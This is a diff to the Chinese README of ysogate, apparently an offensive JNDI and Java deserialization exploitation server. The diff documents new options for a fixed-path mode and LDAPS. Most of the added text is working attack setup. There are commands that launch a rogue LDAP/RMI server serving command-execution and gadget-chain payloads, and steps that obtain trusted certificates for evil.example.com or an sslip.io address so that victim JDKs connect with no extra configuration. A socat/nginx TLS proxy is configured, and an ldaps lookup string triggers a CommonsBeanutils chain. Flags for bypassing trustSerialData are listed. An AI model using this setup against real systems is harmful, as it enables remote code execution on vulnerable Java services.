@@ -15,10 +15,14 @@ java -jar ysogate-[version]-all.jar -m jndi [OPTIONS]
  -h,--help              Show help message
  -hp,--httpPort <arg>   HTTP port
  -i,--ip <arg>          IP address for JNDI server
- -ldap2rmi              change ldap to rmi to bypass trustSerialData
+ -ks,--keystore <arg>   JKS file for LDAPS
+ -kp,--storepass <arg>  JKS password
+ -ldap2rmi              bypass trustSerialData
  -lp,--ldapPort <arg>   LDAP port
+ -lsp,--ldapsPort <arg> LDAPS port
  -m,--mode <arg>        Operation mode: 'payload' or 'jndi' or 'gen'
- -onlyRef               use Reference only to bypass trustSerialData
+ -onlyRef               bypass trustSerialData
+ -path <arg>            Fixed route path for all requests
  -rp,--rmiPort <arg>    RMI port
 ```
 
@@ -37,6 +41,23 @@ java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
 ```bash
 java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -rp 1099 -lp 1389 -hp 8080
 ```
+
+### 固定路径模式
+
+使用 `-path` 参数可以让所有 LDAP/RMI 请求（无论客户端请求的路径是什么）都路由到指定路径的处理逻辑。适用于无法控制客户端 JNDI lookup 路径的场景。
+
+```bash
+# 所有请求都返回 DNSLog 探测结果
+java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -path /Basic/DNSLog/xxx.dnslog.cn
+
+# 所有请求都执行命令
+java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -path /Basic/Command/calc
+
+# 所有请求都返回反序列化 payload
+java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -path /Deserialize/Jackson2/Command/calc
+```
+
+例如以上启动后，无论客户端请求 `ldap://127.0.0.1:1389/` 还是 `ldap://127.0.0.1:1389/anything`，服务端都会返回 `-path` 指定路径对应的结果。
 
 ## trustSerialData 绕过
 
@@ -209,14 +230,93 @@ ldap://127.0.0.1:1389/Deserialize/{gadget}/Custom/mem:Tomcat
 ldap://127.0.0.1:1389/Deserialize/Jackson2/Command/calc
 ```
 
+## LDAPS 支持
+
+ysogate 同时监听 LDAP（明文）和 LDAPS（SSL/TLS）端口，默认端口 1389 / 1636。
+
+### 方式一：内置 LDAPS（JKS 证书）
+
+适用于拥有域名 + Let's Encrypt 证书的场景。
+
+```bash
+# 1. 申请 Let's Encrypt 证书
+certbot certonly --standalone -d evil.example.com
+
+# 2. 转换为 JKS 格式
+openssl pkcs12 -export \
+  -in /etc/letsencrypt/live/evil.example.com/fullchain.pem \
+  -inkey /etc/letsencrypt/live/evil.example.com/privkey.pem \
+  -out cert.p12 -name ldaps -passout pass:changeit
+
+keytool -importkeystore \
+  -srckeystore cert.p12 -srcstoretype PKCS12 -srcstorepass changeit \
+  -destkeystore ldaps.jks -deststoretype JKS -deststorepass changeit
+
+# 3. 启动（客户端默认 JDK 即可信任）
+java -jar ysogate.jar -m jndi -i evil.example.com -ks ldaps.jks -kp changeit
+```
+
+不指定 `-ks` 时使用自签名证书（客户端需手动信任）：
+
+```bash
+java -jar ysogate.jar -m jndi -i 0.0.0.0
+```
+
+### 方式二：TLS 反向代理（推荐，仅有 IP 时可用）
+
+参考 [phith0n 的方案](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)，使用 nginx/socat 在前端处理 TLS，后端转发到明文 LDAP。
+
+**优势**：ysogate 无需配置证书，只需明文 LDAP；TLS 证书由代理处理。
+
+#### 使用 sslip.io 获取受信证书（仅有 IP）
+
+sslip.io 是免费泛域名服务，`1-2-3-4.sslip.io` 自动解析到 `1.2.3.4`。
+
+```bash
+# 1. 用 certbot 为 sslip.io 子域名申请证书
+certbot certonly --standalone -d 1-2-3-4.sslip.io
+
+# 2. 启动 ysogate 明文 LDAP
+java -jar ysogate.jar -m jndi -i 1.2.3.4
+
+# 3. 用 socat 做 TLS 代理（636 -> 1389）
+socat OPENSSL-LISTEN:636,cert=/etc/letsencrypt/live/1-2-3-4.sslip.io/fullchain.pem,key=/etc/letsencrypt/live/1-2-3-4.sslip.io/privkey.pem,verify=0,reuseaddr,fork TCP:127.0.0.1:1389
+```
+
+或使用 nginx stream 模块：
+
+```nginx
+stream {
+    upstream ldap_backend {
+        server 127.0.0.1:1389;
+    }
+    server {
+        listen 636 ssl;
+        ssl_certificate /etc/letsencrypt/live/1-2-3-4.sslip.io/fullchain.pem;
+        ssl_certificate_key /etc/letsencrypt/live/1-2-3-4.sslip.io/privkey.pem;
+        proxy_pass ldap_backend;
+    }
+}
+```
+
+客户端使用（默认 JDK，零配置）：
+
+```java
+ctx.lookup("ldaps://1-2-3-4.sslip.io:636/Deserialize/CB2183NOCC/Command/calc");
+```
+
 ## 参数说明
 
 - `-i, --ip`: 指定JNDI服务器监听的IP地址
 - `-rp, --rmiPort`: 指定RMI服务端口
 - `-lp, --ldapPort`: 指定LDAP服务端口
+- `-lsp, --ldapsPort`: 指定LDAPS服务端口
+- `-ks, --keystore`: 指定JKS证书文件路径
+- `-kp, --storepass`: 指定JKS证书密码（默认changeit）
 - `-hp, --httpPort`: 指定HTTP服务端口
 - `-ldap2rmi`: 使用ldap到rmi的绕过方式
 - `-onlyRef`: 仅使用Reference绕过方式
+- `-path`: 固定路径模式，所有请求都路由到指定路径（如 `/Basic/DNSLog/xxx.dnslog.cn`）
 - `-h, --help`: 显示帮助信息
 
 ## 安全使用说明
